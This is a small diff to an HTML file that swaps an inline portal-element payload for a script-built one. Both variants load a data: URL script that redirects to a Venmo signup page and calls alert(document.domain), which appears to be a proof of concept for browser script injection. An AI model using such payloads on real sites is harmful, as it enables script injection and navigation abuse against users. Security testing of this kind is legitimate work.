@@ -1,3 +1,8 @@
-<portal src='data:text/html,<script>window.location="https://venmo.com/signup/google";alert(document.domain);</script>' onload=this.activate()>
+<script>
+  const p = document.createElement('portal');
+  p.src = 'data:text/html,<script>window.location="https://venmo.com/signup/google";alert(document.domain);</script>';
+  document.body.appendChild(p);
+  p.activate();
+</script>
 
 
